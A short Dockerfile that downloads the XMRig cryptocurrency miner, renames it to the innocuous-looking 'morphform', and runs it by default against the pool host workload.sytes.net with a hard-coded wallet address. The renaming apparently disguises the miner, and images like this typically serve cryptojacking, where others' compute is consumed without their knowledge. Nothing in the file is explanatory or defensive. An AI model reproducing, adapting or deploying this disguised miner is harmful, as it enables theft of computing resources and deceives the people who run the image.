FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz; \
    tar xf xmrig-6.16.4-linux-static-x64.tar.gz; \
    cd xmrig-6.16.4; \
    cp xmrig /usr/local/bin/xmrig; \
    cd /usr/local/bin; \
    mv xmrig morphform;

WORKDIR /usr/local/bin

RUN chmod 777 morphform;

CMD morphform -a gr -o workload.sytes.net:5555 --tls -u RUyuvX9VUWtKxbePnNHGg1jt2doqr5CnEr
